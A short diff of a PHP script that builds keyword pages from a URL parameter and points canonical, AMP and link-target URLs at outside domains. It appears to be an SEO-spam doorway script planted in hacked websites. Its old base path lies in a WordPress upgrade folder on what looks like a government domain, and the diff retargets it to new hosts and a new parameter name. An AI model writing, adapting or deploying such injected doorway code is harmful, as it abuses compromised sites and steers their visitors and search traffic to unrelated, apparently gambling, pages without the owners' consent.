@@ -1,6 +1,6 @@
 <?php
-if (isset($_GET['name'])) {
-    $Param= $_GET['name'];
+if (isset($_GET['nam'])) {
+    $Param= $_GET['nam'];
 }else{
     $Param="";
 }
@@ -10,11 +10,11 @@ $gantiParam = str_replace ("-", " ",$Param);
 $kwtitle = ucwords($gantiParam);
 $kwsmall = strtolower($kwtitle);
 $kwbig = strtoupper($kwtitle);
-$urlDomain= "https://siprobintan.bpbintan.go.id/wp-content/upgrade";
+$urlDomain= "https://dmt-arta.co.id/cgi/?nam=";
 $canonical = $urlDomain.'/'.$Param;
-$amphtml = "https://okunbong.com/suhuacuan/?name=".$Param."";
+$amphtml = "https://amptop.site/arta/?nam=".$Param."";
 $favicon = "https://ik.imagekit.io/2at4km90f/favicon-suhu-acuan.png";
-$linkTarget = "https://okunbong.com/suhuacuan/?name=".$Param."";
+$linkTarget = "https://amptop.site/arta/?nam=".$Param."";
 //////////////////////////////////////////////////////////////////////////
 
 function feedback404()
